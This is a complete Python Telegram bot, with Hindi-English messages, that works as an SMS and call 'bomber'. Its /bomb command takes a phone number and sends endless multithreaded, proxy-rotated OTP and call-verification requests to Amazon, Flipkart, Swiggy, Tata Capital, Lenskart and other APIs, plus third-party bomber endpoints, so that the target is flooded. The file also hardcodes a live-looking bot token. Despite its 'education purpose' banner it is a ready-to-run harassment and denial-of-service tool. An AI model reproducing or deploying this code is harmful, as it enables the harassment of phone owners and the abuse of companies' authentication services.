import logging
import threading
import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
from flask import Flask

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = "9116537219:AAGYevPHlV0uaE7LaRwzzjBY1Qlq14XgA5w"
CHANNEL_SIGNATURE = "vip suraj"
# =================================================

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask app for 24/7 Cloud Uptime
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "🤖 Suraj Bhai Proxy-Powered Bomber Bot is 24/7 Alive and Active!"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080)

# Global tracking variables for live stats
BOMBER_STATS = {
    "total_requests_sent": 0,
    "active_targets": 0
}

# Free/Public Proxy Pool (Aap yahan apne paid ya fresh proxies bhi daal sakte hain)
PROXIES_POOL = [
    # Format: "http://ip:port",
    None, # Direct connection fallback
]

# Optimized HTTP Session
session = requests.Session()
adapter = HTTPAdapter(pool_connections=200, pool_maxsize=200)
session.mount('https://', adapter)
session.mount('http://', adapter)

# Expanded API List including Amazon, Flipkart, Shopsy, FreeFire, etc.
APIS = [
    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Amazon OTP",        "url": lambda p, d: "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"email={p}&create=1"},
    {"name": "Flipkart OTP",      "url": lambda p, d: "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Shopsy OTP",        "url": lambda p, d: "https://www.shopsy.in/api/v1/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
]

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = (
        f"╔═══════════════════════════════════╗\n"
        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bot Me** ✨\n"
        f"╚═══════════════════════════════════╝\n\n"
        f"⚠️ **CHETAVANI / WARNING:**\n"
        f"Yeh bot sirf **Education Purpose** ke liye hai.\n\n"
        f"🚀 **Available Commands:**\n"
        f"👉 `/bomb <phone_number>` - Proxy-powered high speed attack shuru karne ke liye.\n"
        f"👉 `/stats` - Live stats check karne ke liye.\n\n"
        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown")

# /stats command
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_msg = (
        f"📊 **Bomber Live Statistics**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
        f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
        f"⚡ Status: Proxy-Rotated High-Speed\n"
        f"👑 Powered By: {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(stats_msg, parse_mode="Markdown")

# Worker function with Proxy Rotation
def send_single_request(api, target_phone):
    try:
        url = api["url"](target_phone, "60")
        headers = api["headers"]
        
        # Random proxy selection from pool if available
        proxy = random.choice(PROXIES_POOL) if PROXIES_POOL else None
        proxies = {"http": proxy, "https": proxy} if proxy else None

        if api["method"] == "GET":
            session.get(url, headers=headers, proxies=proxies, timeout=2)
        elif api["method"] == "POST":
            data = api["data"](target_phone, "60")
            session.post(url, headers=headers, data=data, proxies=proxies, timeout=2)
        
        BOMBER_STATS["total_requests_sent"] += 1
    except Exception:
        pass

# /bomb command handler
async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❌ **Kripya target mobile number dein!**\n\n"
            "📌 *Example:* `/bomb 9876543210`",
            parse_mode="Markdown"
        )
        return
    
    target_phone = context.args[0].strip()
    
    if not target_phone.isdigit() or len(target_phone) != 10:
        await update.message.reply_text(
            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.\n"
            "📌 *Example:* `/bomb 9876543210`",
            parse_mode="Markdown"
        )
        return

    BOMBER_STATS["active_targets"] += 1
    
    await update.message.reply_text(
        f"🎯 **Target Number:** `{target_phone}`\n"
        f"⚡ **Status:** Proxy rotation ke sath high-speed requests shuru ho chuki hain!",
        parse_mode="Markdown"
    )
    
    threading.Thread(
        target=run_proxy_bomber, 
        args=(target_phone, context, update.effective_chat.id)
    ).start()

def run_proxy_bomber(target_phone, context, chat_id):
    try:
        while True:
            with ThreadPoolExecutor(max_workers=60) as executor:
                for api in APIS:
                    executor.submit(send_single_request, api, target_phone)
            time.sleep(0.05)
    except Exception as e:
        print(f"❌ Error: {e}")
    finally:
        BOMBER_STATS["active_targets"] -= 1

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("bomb", handle_bomb_command))

    print(f"🤖 Suraj Bhai Proxy Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
    app.run_polling()

if __name__ == '__main__':
    main()
